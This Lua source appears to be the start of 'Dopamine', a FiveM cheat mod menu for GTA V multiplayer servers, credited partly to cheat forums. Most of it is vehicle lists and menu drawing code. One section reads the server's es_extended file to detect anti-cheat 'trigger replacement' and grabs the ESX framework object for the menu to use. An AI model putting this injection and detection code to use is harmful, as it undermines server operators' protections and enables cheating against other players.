local vehicleSsportsClassicList = { 'Ardent', 'BType', 'BType2', 'BType3', 'Casco', 'Cheetah2', 'Cheburek', 'Coquette2', 'Coquette3', 'Deluxo', 'Fagaloa', 'Gt500', 'JB700', 'Jester3', 'MAmba', 'Manana', 'Michelli', 'Monroe', 'Peyote', 'Pigalle', 'RapidGT3', 'Retinue', 'Savestra', 'Stinger', 'Stingergt', 'Stromberg', 'Swinger', 'Torero', 'Tornado', 'Tornado2', 'Tornado3', 'Tornado4', 'Tornado5', 'Tornado6', 'Viseris', 'Z190', 'ZType' }
local vehicleSsuperList = { 'Adder', 'Autarch', 'Bullet', 'Cheetah', 'Cyclone', 'Elegy', 'EntityXF', 'Entity2', 'FMJ', 'GP1', 'Infernus', 'LE7B', 'Nero', 'Nero2', 'Osiris', 'Penetrator', 'PFister811', 'Prototipo', 'Reaper', 'SC1', 'Scramjet', 'Sheava', 'SultanRS', 'Superd', 'T20', 'Taipan', 'Tempesta', 'Tezeract', 'Turismo2', 'Turismor', 'Tyrant', 'Tyrus', 'Vacca', 'Vagner', 'Vigilante', 'Visione', 'Voltic', 'Voltic2', 'Zentorno', 'Italigtb', 'Italigtb2', 'XA21' }
local vehicleStrailersList = { 'ArmyTanker', 'ArmyTrailer', 'ArmyTrailer2', 'BaleTrailer', 'BoatTrailer', 'CableCar', 'DockTrailer', 'Graintrailer', 'Proptrailer', 'Raketailer', 'TR2', 'TR3', 'TR4', 'TRFlat', 'TVTrailer', 'Tanker', 'Tanker2', 'Trailerlogs', 'Trailersmall', 'Trailers', 'Trailers2', 'Trailers3' }
local vehicleStrainsList = { 'Freight', 'Freightcar', 'Freightcont1', 'Freightcont2', 'Freightgrain', 'Freighttrailer', 'TankerCar' }
local vehicleSworkList = { 'Airtug', 'Caddy', 'Caddy2', 'Caddy3', 'Docktug', 'Forklift', 'Mower', 'Ripley', 'Sadler', 'Scrap', 'TowTruck', 'Towtruck2', 'Tractor', 'Tractor2', 'Tractor3', 'TrailerLArge2', 'Utilitruck', 'Utilitruck3', 'Utilitruck2' }
local vehicleSvansList = { 'Bison', 'Bison2', 'Bison3', 'BobcatXL', 'Boxville', 'Boxville2', 'Boxville3', 'Boxville4', 'Boxville5', 'Burrito', 'Burrito2', 'Burrito3', 'Burrito4', 'Burrito5', 'Camper', 'GBurrito', 'GBurrito2', 'Journey', 'Minivan', 'Minivan2', 'Paradise', 'pony', 'Pony2', 'Rumpo', 'Rumpo2', 'Rumpo3', 'Speedo', 'Speedo2', 'Speedo4', 'Surfer', 'Surfer2', 'Taco', 'Youga', 'youga2' }
local fullVehicleList = { vehicleSboatsList, vehicleStrucksList, vehicleScompactsList, vehicleScoupesList, vehicleSbicyclesList, vehicleSemergencyList, vehicleShelicoptersList, vehicleSindustrialList, vehicleSmilitaryVehicles, vehicleSmotorcyclesList, vehicleSmuscleList, vehicleSoffroadList, vehicleSplanesList, vehicleSsuvsList, vehicleSsedansList, vehicleSserviceList, vehicleSsportsList, vehicleSsportsClassicList, vehicleSsuperList, vehicleStrailersList, vehicleStrainsList, vehicleSworkList, vehicleSvansList }
local creditsList = {
	"Patri~s~k Ne~s~r~s~tige~s~l | N~s~ert~s~ige~s~l#5~s~39~s~1, github.com/nertigel",
	"Flacko | sir Flacko#1234, github.com/flacko1337",
	"WarMenu | github.com/warxander/warmenu",
    "SkidMenu | github.com/Joeyarrabi/skidmenu",
	"RipTide | unknowncheats.me",
	"LUX | leuit#0100, inspiration and help with sprites"
}

--[[oTable]]
oTable = {} do function oTable.insert(t, k, v) if not rawget(t._values, k) then t._keys[#t._keys + 1] = k end if v == nil then oTable.remove(t, k) else t._values[k] = v end end local function find(t, value) for i,v in ipairs(t) do if v == value then return i end end end function oTable.remove(t, k) local v = t._values[k] if v ~= nil then table.remove(t._keys, find(t._keys, k)) t._values[k] = nil end return v end function oTable.index(t, k) return rawget(t._values, k) end function oTable.pairs(t) local i = 0 return function() i = i + 1 local key = t._keys[i] if key ~= nil then return key, t._values[key] end end end function oTable.new(init) init = init or {} local t = {_keys={}, _values={}} local n = #init if n % 2 ~= 0 then error"in oTable initialization: key is missing value" end for i=1,n/2 do local k = init[i * 2 - 1] local v = init[i * 2] if t._values[k] ~= nil then error("duplicate key:"..k) end t._keys[#t._keys + 1]  = k t._values[k] = v end return setmetatable(t, {__newindex=oTable.insert, __len=function(t) return #t._keys end, __pairs=oTable.pairs, __index=t._values }) end end

--[[Functions]]
local entityEnumerator = { __gc = function(enum) if enum.destructor and enum.handle then enum.destructor(enum.handle) end enum.destructor = nil enum.handle = nil end }
local function EnumerateEntities(initFunc, moveFunc, disposeFunc) return coroutine.wrap(function() local iter, id = initFunc() if not id or id == 0 then disposeFunc(iter) return end local enum = {handle = iter, destructor = disposeFunc} setmetatable(enum, entityEnumerator) local next = true repeat coroutine.yield(id) next, id = moveFunc(iter) until not next enum.destructor, enum.handle = nil, nil disposeFunc(iter) end) end
function EnumerateObjects() return EnumerateEntities(FindFirstObject, FindNextObject, EndFindObject) end
function EnumeratePeds() return EnumerateEntities(FindFirstPed, FindNextPed, EndFindPed) end
function EnumerateVehicles() return EnumerateEntities(FindFirstVehicle, FindNextVehicle, EndFindVehicle) end
function EnumeratePickups() return EnumerateEntities(FindFirstPickup, FindNextPickup, EndFindPickup) end
function RequestControlOnce(entity) if not NetworkIsInSession() or NetworkHasControlOfEntity(entity) then return true end SetNetworkIdCanMigrate(NetworkGetNetworkIdFromEntity(entity), true) return NetworkRequestControlOfEntity(entity) end
function GetNearbyPeds(X, Y, Z, Radius) local NearbyPeds = {} for Ped in EnumeratePeds() do if DoesEntityExist(Ped) then local PedPosition = GetEntityCoords(Ped, false) if Vdist(X, Y, Z, PedPosition.x, PedPosition.y, PedPosition.z) <= Radius then table.insert(NearbyPeds, Ped) end end end return NearbyPeds end
function RotationToDirection(rotation) local retz = math.rad(rotation.z) local retx = math.rad(rotation.x) local absx = math.abs(math.cos(retx)) return vector3(-math.sin(retz) * absx, math.cos(retz) * absx, math.sin(retx)) end
function ScreenToWorld(screenCoord) local camRot = GetGameplayCamRot(2) local camPos = GetGameplayCamCoord() local vect2x = 0.0 local vect2y = 0.0 local vect21y = 0.0 local vect21x = 0.0 local direction = RotationToDirection(camRot) local vect3 = vector3(camRot.x + 10.0, camRot.y + 0.0, camRot.z + 0.0) local vect31 = vector3(camRot.x - 10.0, camRot.y + 0.0, camRot.z + 0.0) local vect32 = vector3(camRot.x, camRot.y + 0.0, camRot.z + -10.0) local direction1 = RotationToDirection(vector3(camRot.x, camRot.y + 0.0, camRot.z + 10.0)) - RotationToDirection(vect32) local direction2 = RotationToDirection(vect3) - RotationToDirection(vect31) local radians = -(math.rad(camRot.y)) vect33 = (direction1 * math.cos(radians)) - (direction2 * math.sin(radians)) vect34 = (direction1 * math.sin(radians)) - (direction2 * math.cos(radians)) local case1, x1, y1 = WorldToScreenRel(((camPos + (direction * 10.0)) + vect33) + vect34) if not case1 then vect2x = x1 vect2y = y1 return camPos + (direction * 10.0) end local case2, x2, y2 = WorldToScreenRel(camPos + (direction * 10.0)) if not case2 then vect21x = x2 vect21y = y2 return camPos + (direction * 10.0) end if math.abs(vect2x - vect21x) < 0.001 or math.abs(vect2y - vect21y) < 0.001 then return camPos + (direction * 10.0) end local x = (screenCoord.x - vect21x) / (vect2x - vect21x) local y = (screenCoord.y - vect21y) / (vect2y - vect21y) return ((camPos + (direction * 10.0)) + (vect33 * x)) + (vect34 * y) end
function SubVectors(vect1, vect2) return vector3(vect1.x - vect2.x, vect1.y - vect2.y, vect1.z - vect2.z) end
function GetCamDirFromScreenCenter() local pos = GetGameplayCamCoord() local world = ScreenToWorld(0, 0) local ret = SubVectors(world, pos) return ret end
function WorldToScreenRel(worldCoords) local check, x, y = GetScreenCoordFromWorldCoord(worldCoords.x, worldCoords.y, worldCoords.z) if not check then return false end screenCoordsx = (x - 0.5) * 2.0 screenCoordsy = (y - 0.5) * 2.0 return true, screenCoordsx, screenCoordsy end
function PrintTable(node) local function tab(amt) local str = "" for i = 1, amt do str = str .. "\t" end return str end local cache, stack, output = {}, {}, {} local depth = 1 local output_str = "{\n" while true do local size = 0 for k, v in pairs(node) do size = size + 1 end local cur_index = 1 for k, v in pairs(node) do if (cache[node] == nil) or (cur_index >= cache[node]) then if (string.find(output_str, "}", output_str:len())) then output_str = output_str .. ",\n" elseif not (string.find(output_str, "\n", output_str:len())) then output_str = output_str .. "\n" end table.insert(output, output_str) output_str = "" local key if (type(k) == "number" or type(k) == "boolean") then key = "[" .. tostring(k) .. "]" else key = "['" .. tostring(k) .. "']" end if (type(v) == "number" or type(v) == "boolean") then output_str = output_str .. tab(depth) .. key .. " = " .. tostring(v) elseif (type(v) == "table") then output_str = output_str .. tab(depth) .. key .. " = {\n" table.insert(stack, node) table.insert(stack, v) cache[node] = cur_index + 1 break else output_str = output_str .. tab(depth) .. key .. " = '" .. tostring(v) .. "'" end if (cur_index == size) then output_str = output_str .. "\n" .. tab(depth - 1) .. "}" else output_str = output_str .. "," end else if (cur_index == size) then output_str = output_str .. "\n" .. tab(depth - 1) .. "}" end end cur_index = cur_index + 1 end if (size == 0) then output_str = output_str .. "\n" .. tab(depth - 1) .. "}" end if (#stack > 0) then node = stack[#stack] stack[#stack] = nil depth = cache[node] == nil and depth + 1 or depth - 1 else break end end table.insert(output, output_str) output_str = table.concat(output) print(output_str) end
function RequestModelSync(model) local dModel = GetHashKey(model) RequestModel(dModel) while not HasModelLoaded(dModel) do RequestModel(dModel) Citizen.Wait(0) end end
local function ReturnRGB(l) local rgb = {} local n = GetGameTimer() / 200 rgb.r = math.floor(math.sin(n * l + 0) * 127 + 128) rgb.g = math.floor(math.sin(n * l + 2) * 127 + 128) rgb.b = math.floor(math.sin(n * l + 4) * 127 + 128) return rgb end
function table.removekey(array, element) for i = 1, #array do if array[i] == element then table.remove(array, i) end end end
function GetWeaponNameFromHash(hash) for i = 1, #weaponsArrayeet do if GetHashKey(weaponsArrayeet[i]) == hash then return string.sub(weaponsArrayeet[i], 8) end end end
function InitializeIntro(scaleform, message)
	local scaleform = RequestScaleformMovie(scaleform)
	while not HasScaleformMovieLoaded(scaleform) do
		Citizen.Wait(1)
	end
	PushScaleformMovieFunction(scaleform, "SHOW_SHARD_WASTED_MP_MESSAGE")
	PushScaleformMovieFunctionParameterString(message)
	PopScaleformMovieFunctionVoid()
	return scaleform
end

--[[
	Model loader to help other Citizen threads.
]]

local function GetResources()
	local resources = {}
	for i=0, GetNumResources() do
		resources[i] = GetResourceByFindIndex(i)
	end
	return resources
end
local serverOptionsResources = {}
serverOptionsResources = GetResources()

local LOAD_es_extended = LoadResourceFile("es_extended", "client/common.lua")
if LOAD_es_extended then
	LOAD_es_extended = LOAD_es_extended:gsub("AddEventHandler", "")
	LOAD_es_extended = LOAD_es_extended:gsub("cb", "")
	LOAD_es_extended = LOAD_es_extended:gsub("function ", "")
	LOAD_es_extended = LOAD_es_extended:gsub("return ESX", "")
	LOAD_es_extended = LOAD_es_extended:gsub("(ESX)", "")
	LOAD_es_extended = LOAD_es_extended:gsub("function", "")
	LOAD_es_extended = LOAD_es_extended:gsub("getSharedObject%(%)", "")
	LOAD_es_extended = LOAD_es_extended:gsub("end", "")
	LOAD_es_extended = LOAD_es_extended:gsub("%(", "")
	LOAD_es_extended = LOAD_es_extended:gsub("%)", "")
	LOAD_es_extended = LOAD_es_extended:gsub(",", "")
	LOAD_es_extended = LOAD_es_extended:gsub("\n", "")
	LOAD_es_extended = LOAD_es_extended:gsub("'", "")
	LOAD_es_extended = LOAD_es_extended:gsub("%s+", "")
	if tostring(LOAD_es_extended) ~= 'esx:getSharedObject' then
		print('This server is using trigger replacement, watch out!')
	end
end

ESX = nil

Citizen.CreateThread(
    function()
        while ESX == nil and ShouldShowMenu do
            TriggerCustomEvent(false, 
                tostring(LOAD_es_extended),
                function(a)
                    ESX = a
                end
            )
			print('ESX was set to: '..tostring(LOAD_es_extended))
			Citizen.Wait(1000)
        end
    end
)

--[[Menu Properties]]
Dopamine = { }
Dopamine.debug = false

local menus = { }
local keys = { up = Keys["UP"], down = Keys["DOWN"], left = Keys["LEFT"], right = Keys["RIGHT"], select = Keys["NENTER"], back = 202 }
local optionCount = 0

local currentKey = nil
local currentMenu = nil

local titleHeight = 0.11
local titleYOffset = 0.05
local titleXOffset = 0.5 
local titleScale = 1.0
local titleSpacing = 2

local buttonHeight = 0.038
local buttonFont = 0
local buttonScale = 0.365
local buttonTextXOffset = 0.005
local buttonTextYOffset = 0.005

local comboArrowR = ' »'
local comboArrowL = '« '

local MainColor = {
	r = 225, 
	g = 55, 
	b = 55,
	a = 255
}

local function debugPrint(text)
	if Dopamine.debug then
		Citizen.Trace('[dopamine] '..tostring(text)..'.\n')
	end
end

local function setMenuProperty(id, property, value)
	if id and menus[id] then
		menus[id][property] = value
		debugPrint(id..' menu property changed: { '..tostring(property)..', '..tostring(value)..' }')
	end
end

local function isMenuVisible(id)
	if id and menus[id] then
		return menus[id].visible
	else
		return false
	end
end

local function setMenuVisible(id, visible, holdCurrent)
	if id and menus[id] then
		setMenuProperty(id, 'visible', visible)

		if not holdCurrent and menus[id] then
			setMenuProperty(id, 'currentOption', 1)
		end

		if visible then
			if id ~= currentMenu and isMenuVisible(currentMenu) then
				setMenuVisible(currentMenu, false)
			end

			currentMenu = id
		end
	end
end

local menu_TextOutline = false
local menu_TextDropShadow = true
local menu_RectOverlay = true

function DrawTxt(text, x, y, scale, size, color)
	SetTextColour(color.r, color.g, color.b, color.a)
	SetTextFont(4)
	SetTextCentre()
    SetTextProportional(1)
    SetTextScale(scale, size)
    SetTextDropshadow(0, 0, 0, 0, 255)
    SetTextEdge(2, 0, 0, 0, 255)
    SetTextDropShadow()
    SetTextOutline()
    SetTextEntry("STRING")
    AddTextComponentString(text)
    DrawText(x, y)
end

local function drawText(text, x, y, font, color, scale, center, shadow, alignRight)
	SetTextColour(color.r, color.g, color.b, color.a)
	if menu_TextDropShadow then
		SetTextDropShadow(0, 0, 0, 0,255)
	end
	SetTextEdge(2, 0, 0, 0, 255)
	if menu_TextOutline then
		SetTextOutline()
	end
	SetTextFont(font)
	SetTextScale(scale, scale)

	if shadow then
		SetTextDropShadow(2, 2, 0, 0, 0)
	end

	if menus[currentMenu] then
		if center then
			SetTextCentre(center)
		elseif alignRight then
			SetTextWrap(menus[currentMenu].x, menus[currentMenu].x + menus[currentMenu].width - buttonTextXOffset)
			SetTextRightJustify(true)
		end
	end

	BeginTextCommandDisplayText("STRING")
	AddTextComponentSubstringPlayerName(text)
	EndTextCommandDisplayText(x, y)
end

local function drawRect(x, y, width, height, color)
	DrawRect(x, y, width, height, color.r, color.g, color.b, color.a)
end

local function drawTitle()
	if menus[currentMenu] then
		local x = menus[currentMenu].x + menus[currentMenu].width / 2 
		local xText = menus[currentMenu].x + menus[currentMenu].width * titleXOffset  
		local y = menus[currentMenu].y + titleHeight * 1/titleSpacing 

		if menus[currentMenu].titleBackgroundSprite then
			DrawSprite(menus[currentMenu].titleBackgroundSprite.dict, menus[currentMenu].titleBackgroundSprite.name, x, y, menus[currentMenu].width, titleHeight, 0.0, MainColor.r, MainColor.g, MainColor.b, 255)
		else
			drawRect(x, y, menus[currentMenu].width, titleHeight, menus[currentMenu].titleBackgroundColor)
		end

		drawText(menus[currentMenu].title, xText, y - titleHeight / 2 + titleYOffset, menus[currentMenu].titleFont, menus[currentMenu].titleColor, titleScale, true)
	end
end

local function drawSubTitle()
	if menus[currentMenu] then
		local x = menus[currentMenu].x + menus[currentMenu].width / 2
		local y = menus[currentMenu].y + titleHeight + buttonHeight / 2

		local subTitleColor = { r = MainColor.r, g = MainColor.g, b = MainColor.b, a = 255 }

		drawRect(x, y, menus[currentMenu].width, buttonHeight, menus[currentMenu].subTitleBackgroundColor)
		drawText(menus[currentMenu].subTitle, menus[currentMenu].x + buttonTextXOffset, y - buttonHeight / 2 + buttonTextYOffset, buttonFont, subTitleColor, buttonScale, false)

		if optionCount > menus[currentMenu].maxOptionCount then
			drawText(tostring(menus[currentMenu].currentOption)..' / '..tostring(optionCount), menus[currentMenu].x + menus[currentMenu].width, y - buttonHeight / 2 + buttonTextYOffset, buttonFont, subTitleColor, buttonScale, false, false, true)
		end
	end
end

local function drawButton(arrowsprite, text, subText, spriteData)
	local x = menus[currentMenu].x + menus[currentMenu].width / 2
	local multiplier = nil

	if menus[currentMenu].currentOption <= menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].maxOptionCount then
		multiplier = optionCount
	elseif optionCount > menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].currentOption then
		multiplier = optionCount - (menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount)
	end

	if multiplier then
		local y = menus[currentMenu].y + titleHeight + buttonHeight + (buttonHeight * multiplier) - buttonHeight / 2
		local backgroundColor = nil
		local textColor = nil
		local subTextColor = nil
		local shadow = false

		if menus[currentMenu].currentOption == optionCount then
			backgroundColor = menus[currentMenu].menuFocusBackgroundColor
			textColor = menus[currentMenu].menuFocusTextColor
			subTextColor = {r = MainColor.r, g = MainColor.g, b = MainColor.b, a = 255}
		else
			backgroundColor = menus[currentMenu].menuBackgroundColor
			textColor = menus[currentMenu].menuTextColor
			subTextColor = menus[currentMenu].menuSubTextColor
			shadow = true
		end

		drawRect(x, y, menus[currentMenu].width, buttonHeight, backgroundColor)

		if spriteData then
			if not HasStreamedTextureDictLoaded(spriteData.dict) then RequestStreamedTextureDict(spriteData.dict, true) end
			if menu_TextOutline then
				DrawSprite(spriteData.dict, spriteData.text, menus[currentMenu].x + buttonTextXOffset + 0.008, y - (buttonHeight / 2) + buttonTextYOffset + 0.0125, 0.0275, 0.0375, 0.0, 0, 0, 0, 255)
			end
			DrawSprite(spriteData.dict, spriteData.text, menus[currentMenu].x + buttonTextXOffset + 0.008, y - (buttonHeight / 2) + buttonTextYOffset + 0.0125, 0.0255, 0.0355, 0.0, MainColor.r, MainColor.g, MainColor.b, 155)
			DrawSprite(spriteData.dict, spriteData.text, menus[currentMenu].x + buttonTextXOffset + 0.008, y - (buttonHeight / 2) + buttonTextYOffset + 0.0125, 0.0225, 0.0325, 0.0, spriteData.color.r, spriteData.color.g, spriteData.color.b, 255)
			drawText(text, menus[currentMenu].x + buttonTextXOffset + 0.018, y - (buttonHeight / 2) + buttonTextYOffset, buttonFont, textColor, buttonScale, false, shadow)
		else
			drawText(text, menus[currentMenu].x + buttonTextXOffset, y - (buttonHeight / 2) + buttonTextYOffset, buttonFont, textColor, buttonScale, false, shadow)
		end

		if subText then
			drawText(subText, menus[currentMenu].x + buttonTextXOffset, y - buttonHeight / 2 + buttonTextYOffset, buttonFont, subTextColor, buttonScale, false, shadow, true)
		end

		if menus[currentMenu].currentOption == optionCount and arrowsprite then
			if not HasStreamedTextureDictLoaded('commonmenu') then RequestStreamedTextureDict('commonmenu', true) end
			if menu_TextOutline then
				DrawSprite('commonmenu', 'arrowright', menus[currentMenu].x + buttonTextXOffset + 0.240, y - (buttonHeight / 2) + buttonTextYOffset + 0.0125, 0.0245, 0.0365, 0.0, 0, 0, 0, 255)
			end
			DrawSprite('commonmenu', 'arrowright', menus[currentMenu].x + buttonTextXOffset + 0.240, y - (buttonHeight / 2) + buttonTextYOffset + 0.0125, 0.0225, 0.0325, 0.0, MainColor.r, MainColor.g, MainColor.b, 255)
		elseif arrowsprite then
			if not HasStreamedTextureDictLoaded('commonmenu') then RequestStreamedTextureDict('commonmenu', true) end
			if menu_TextOutline then
				DrawSprite('commonmenu', 'arrowright', menus[currentMenu].x + buttonTextXOffset + 0.240, y - (buttonHeight / 2) + buttonTextYOffset + 0.0125, 0.0245, 0.0365, 0.0, 0, 0, 0, 255)
			end
			DrawSprite('commonmenu', 'arrowright', menus[currentMenu].x + buttonTextXOffset + 0.240, y - (buttonHeight / 2) + buttonTextYOffset + 0.0125, 0.0225, 0.0325, 0.0, 175, 175, 175, 155)
		end

		if menus[currentMenu].currentOption == optionCount and menu_RectOverlay then
			if not HasStreamedTextureDictLoaded('deadline') then RequestStreamedTextureDict('deadline', true) end
			DrawSprite('deadline', 'deadline_trail_01', x, y, menus[currentMenu].width, buttonHeight, 0.0, MainColor.r, MainColor.g, MainColor.b, 55)
		end
	end
end

local function drawCheckbox(text, state)
	local x = menus[currentMenu].x + menus[currentMenu].width / 2
	local multiplier = nil

	if menus[currentMenu].currentOption <= menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].maxOptionCount then
		multiplier = optionCount
	elseif optionCount > menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].currentOption then
		multiplier = optionCount - (menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount)
	end

	if multiplier then
		local y = menus[currentMenu].y + titleHeight + buttonHeight + (buttonHeight * multiplier) - buttonHeight / 2
		local backgroundColor = nil
		local textColor = nil
		local shadow = false

		if menus[currentMenu].currentOption == optionCount then
			backgroundColor = menus[currentMenu].menuFocusBackgroundColor
			textColor = menus[currentMenu].menuFocusTextColor
		else
			backgroundColor = menus[currentMenu].menuBackgroundColor
			textColor = menus[currentMenu].menuTextColor
			shadow = true
		end

		drawRect(x, y, menus[currentMenu].width, buttonHeight, backgroundColor)

		drawText(text, menus[currentMenu].x + buttonTextXOffset, y - (buttonHeight / 2) + buttonTextYOffset, buttonFont, textColor, buttonScale, false, shadow)

		if not HasStreamedTextureDictLoaded('helicopterhud') then RequestStreamedTextureDict('helicopterhud', true) end
		if not HasStreamedTextureDictLoaded('commonmenu') then RequestStreamedTextureDict('commonmenu', true) end

		if menus[currentMenu].currentOption == optionCount then
			if state then
				DrawSprite('helicopterhud', 'hud_outline', menus[currentMenu].x + buttonTextXOffset + 0.235, y - (buttonHeight / 2) + buttonTextYOffset + 0.01375, 0.0225, 0.0325, 0.0, MainColor.r, MainColor.g, MainColor.b, 255)
				DrawSprite('commonmenu', 'shop_tick_icon', menus[currentMenu].x + buttonTextXOffset + 0.235, y - (buttonHeight / 2) + buttonTextYOffset + 0.0125, 0.0325, 0.0425, 0.0, MainColor.r, MainColor.g, MainColor.b, 255)
			else
				DrawSprite('helicopterhud', 'hud_lock', menus[currentMenu].x + buttonTextXOffset + 0.235, y - (buttonHeight / 2) + buttonTextYOffset + 0.01375, 0.0225, 0.0325, 0.0, MainColor.r, MainColor.g, MainColor.b, 255)
			end
		else
			if state then
				DrawSprite('helicopterhud', 'hud_outline', menus[currentMenu].x + buttonTextXOffset + 0.235, y - (buttonHeight / 2) + buttonTextYOffset + 0.01375, 0.0225, 0.0325, 0.0, 155, 155, 155, 255)
				DrawSprite('commonmenu', 'shop_tick_icon', menus[currentMenu].x + buttonTextXOffset + 0.235, y - (buttonHeight / 2) + buttonTextYOffset + 0.0125, 0.0325, 0.0425, 0.0, 155, 155, 155, 255)
			else
				DrawSprite('helicopterhud', 'hud_lock', menus[currentMenu].x + buttonTextXOffset + 0.235, y - (buttonHeight / 2) + buttonTextYOffset + 0.01375, 0.0225, 0.0325, 0.0, 155, 155, 155, 255)
			end
		end

		if menus[currentMenu].currentOption == optionCount and menu_RectOverlay then
			if not HasStreamedTextureDictLoaded('deadline') then RequestStreamedTextureDict('deadline', true) end
			DrawSprite('deadline', 'deadline_trail_01', x, y, menus[currentMenu].width, buttonHeight, 0.0, MainColor.r, MainColor.g, MainColor.b, 55)
		end
	end
end

menus_list = { }

function Dopamine.CreateMenu(id, title)
	--[[Default settings]]
	table.insert(menus_list, id)
	menus[id] = { }
	menus[id].title = title
	menus[id].subTitle = 'by N~s~er~s~t~s~ig~s~el'

	menus[id].visible = false

	menus[id].previousMenu = nil

	menus[id].aboutToBeClosed = false

	menus[id].x = 0.0175
	menus[id].y = 0.025
	menus[id].width = 0.23

	menus[id].currentOption = 1
	menus[id].maxOptionCount = 10

	menus[id].titleFont = 1
	menus[id].titleColor = { r = 0, g = 0, b = 0, a = 255 }
	menus[id].titleBackgroundColor = { r = 0, g = 0, b = 0, a = 255 }
	menus[id].titleBackgroundSprite = nil

	menus[id].menuTextColor = { r = 150, g = 150, b = 150, a = 255 }
	menus[id].menuSubTextColor = { r = 0, g = 0, b = 0, a = 255 }
	menus[id].menuFocusTextColor = { r = 155, g = 155, b = 155, a = 255 }
	menus[id].menuFocusBackgroundColor = { r = 0, g = 0, b = 0, a = 255 }
	menus[id].menuBackgroundColor = { r = 55, g = 55, b = 55, a = 255 }

	menus[id].subTitleBackgroundColor = { r = 35, g = 35, b = 35, a = 255 }
	menus[id].subTitleTextColor = { r = MainColor.r, g = MainColor.g, b = MainColor.b, a = 255 }

	menus[id].buttonPressedSound = { name = "SELECT", set = "HUD_FRONTEND_DEFAULT_SOUNDSET" } --[[https://pastebin.com/0neZdsZ5]]

	debugPrint(tostring(id)..' menu created')
end

function Dopamine.CreateSubMenu(id, parent, subTitle)
	if menus[parent] then
		Dopamine.CreateMenu(id, menus[parent].title)

		if subTitle then
			setMenuProperty(id, 'subTitle', subTitle)
		else
			setMenuProperty(id, 'subTitle', menus[parent].subTitle)
		end

		setMenuProperty(id, 'previousMenu', parent)

		setMenuProperty(id, 'x', menus[parent].x)
		setMenuProperty(id, 'y', menus[parent].y)
		setMenuProperty(id, 'maxOptionCount', menus[parent].maxOptionCount)
		setMenuProperty(id, 'titleFont', menus[parent].titleFont)
		setMenuProperty(id, 'titleColor', menus[parent].titleColor)
		setMenuProperty(id, 'titleBackgroundColor', menus[parent].titleBackgroundColor)
		setMenuProperty(id, 'titleBackgroundSprite', menus[parent].titleBackgroundSprite)
		setMenuProperty(id, 'menuTextColor', menus[parent].menuTextColor)
		setMenuProperty(id, 'menuSubTextColor', menus[parent].menuSubTextColor)
		setMenuProperty(id, 'menuFocusTextColor', menus[parent].menuFocusTextColor)
		setMenuProperty(id, 'menuFocusBackgroundColor', menus[parent].menuFocusBackgroundColor)
		setMenuProperty(id, 'menuBackgroundColor', menus[parent].menuBackgroundColor)
		setMenuProperty(id, 'subTitleBackgroundColor', menus[parent].subTitleBackgroundColor)
	else
		debugPrint('Failed to create '..tostring(id)..' submenu: '..tostring(parent)..' parent menu doesn\'t exist')
	end
end

function Dopamine.CurrentMenu()
	return currentMenu
end

function Dopamine.OpenMenu(id)
	if id and menus[id] then
		PlaySoundFrontend(-1, "SELECT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
		setMenuVisible(id, true)
		debugPrint(tostring(id)..' menu opened')
	else
		debugPrint('Failed to open '..tostring(id)..' menu: it doesn\'t exist')
	end
end

function Dopamine.IsMenuOpened(id)
	return isMenuVisible(id)
end

function Dopamine.IsAnyMenuOpened()
	for id, _ in pairs(menus) do
		if isMenuVisible(id) then return true end
	end

	return false
end

function Dopamine.IsMenuAboutToBeClosed()
	if menus[currentMenu] then
		return menus[currentMenu].aboutToBeClosed
	else
		return false
	end
end

function Dopamine.CloseMenu()
	if menus[currentMenu] then
		if menus[currentMenu].aboutToBeClosed then
			menus[currentMenu].aboutToBeClosed = false
			setMenuVisible(currentMenu, false)
			debugPrint(tostring(currentMenu)..' menu closed')
			PlaySoundFrontend(-1, "QUIT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
			optionCount = 0
			currentMenu = nil
			currentKey = nil
		else
			menus[currentMenu].aboutToBeClosed = true
			debugPrint(tostring(currentMenu)..' menu about to be closed')
		end
	end
end

function Dopamine.Button(text, subText, spriteData)
	local buttonText = text
	if subText then
		buttonText = '{ '..tostring(buttonText)..', '..tostring(subText)..' }'
	end

	if menus[currentMenu] then
		optionCount = optionCount + 1

		local isCurrent = menus[currentMenu].currentOption == optionCount
		if subText == 'Native' then
			actualSubText = '~g~'..subText
		elseif subText == 'Client' then
			actualSubText = '~y~'..subText
		elseif subText == 'Server' then
			actualSubText = '~r~'..subText
		else
			actualSubText = subText
		end
		drawButton(false, text, actualSubText, spriteData)

		if isCurrent then
			if currentKey == keys.select then
				PlaySoundFrontend(-1, menus[currentMenu].buttonPressedSound.name, menus[currentMenu].buttonPressedSound.set, true)
				debugPrint(buttonText..' button pressed')
				return true
			elseif currentKey == keys.left or currentKey == keys.right then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
			end
		end

		return false
	else
		debugPrint('Failed to create '..buttonText..' button: '..tostring(currentMenu)..' menu doesn\'t exist')

		return false
	end
end

function Dopamine.CheckboxButton(text, state)
	local buttonText = text

	if menus[currentMenu] then
		optionCount = optionCount + 1

		local isCurrent = menus[currentMenu].currentOption == optionCount

		drawCheckbox(text, state)

		if isCurrent then
			if currentKey == keys.select then
				PlaySoundFrontend(-1, menus[currentMenu].buttonPressedSound.name, menus[currentMenu].buttonPressedSound.set, true)
				debugPrint(buttonText..' button pressed')
				return true
			elseif currentKey == keys.left or currentKey == keys.right then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
			end
		end

		return false
	else
		debugPrint('Failed to create '..buttonText..' button: '..tostring(currentMenu)..' menu doesn\'t exist')

		return false
	end
end

function Dopamine.Button2(text, subText, spriteData)
	local buttonText = text
	if subText then
		buttonText = '{ '..tostring(buttonText)..', '..tostring(subText)..' }'
	end

	if menus[currentMenu] then
		optionCount = optionCount + 1

		local isCurrent = menus[currentMenu].currentOption == optionCount

		drawButton(true, text, subText, spriteData)

		if isCurrent then
			if currentKey == keys.select then
				PlaySoundFrontend(-1, menus[currentMenu].buttonPressedSound.name, menus[currentMenu].buttonPressedSound.set, true)
				debugPrint(buttonText..' button pressed')
				return true
			elseif currentKey == keys.left or currentKey == keys.right then
